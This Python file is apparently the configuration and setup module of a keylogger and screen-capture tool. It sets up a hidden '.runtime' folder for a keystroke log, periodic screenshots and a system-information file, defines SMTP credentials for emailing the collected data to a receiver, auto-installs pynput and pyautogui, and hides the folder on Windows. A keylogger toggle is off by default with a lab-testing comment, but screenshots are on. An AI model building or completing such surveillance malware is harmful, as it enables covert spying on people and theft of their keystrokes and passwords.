import sys
import os
import subprocess
import platform

# -------------------------
# Directories
# -------------------------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RUNTIME_DIR = os.path.join(BASE_DIR, ".runtime")
SCREENSHOT_DIR = os.path.join(RUNTIME_DIR, "screenshots")
LOG_FILE = os.path.join(RUNTIME_DIR, "keylog.txt")
SYS_INFO_FILE = os.path.join(RUNTIME_DIR, "system_info.xlsx")

# -------------------------
# Email Config (edit these)
# -------------------------
SENDER_EMAIL = "you@example.com"
SENDER_PASSWORD = "yourpassword"
RECEIVER_EMAIL = "receiver@example.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465

# -------------------------
# Safety Switches
# -------------------------
ENABLE_KEYLOGGER = False # <-- set to True only if explicitly testing in lab
ENABLE_SCREENSHOTS = True
SCREENSHOT_INTERVAL = 30  # seconds

# -------------------------
# Module Installer
# -------------------------
def ensure_module(module_name, package_name=None):
    try:
        __import__(module_name)
    except ImportError:
        pkg = package_name or module_name
        print(f"⚠️ Missing module {pkg}, installing...")

        cmd = [sys.executable, "-m", "pip", "install", pkg]

        # On Kali/Linux force system package install
        if platform.system() == "Linux":
            cmd.append("--break-system-packages")

        try:
            subprocess.check_call(cmd)
        except subprocess.CalledProcessError as e:
            print(f"❌ Failed to install {pkg}: {e}")
            sys.exit(1)

def install_missing_modules():
    ensure_module("pyautogui")
    ensure_module("pynput")
    ensure_module("pandas")
    ensure_module("openpyxl")
    ensure_module("PIL", "pillow")
    ensure_module("requests")

def init_runtime():
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()
    if not os.path.exists(SYS_INFO_FILE):
        open(SYS_INFO_FILE, "w").close()
    hide_file_or_folder(RUNTIME_DIR)

def hide_file_or_folder(path):
    """Hide file/folder cross-platform"""
    try:
        if platform.system() == "Windows":
            subprocess.call(["attrib", "+h", path])
        return path
    except Exception as e:
        print(f"⚠️ Could not hide {path}: {e}")
        return path
    

# Cross-platform emoji handling
if platform.system() == "Windows":
    EMOJI_CHECK = ""
    EMOJI_WARN = ""
    EMOJI_CROSS = ""
else:
    EMOJI_CHECK = "✅"
    EMOJI_WARN = "⚠️"
    EMOJI_CROSS = "❌"
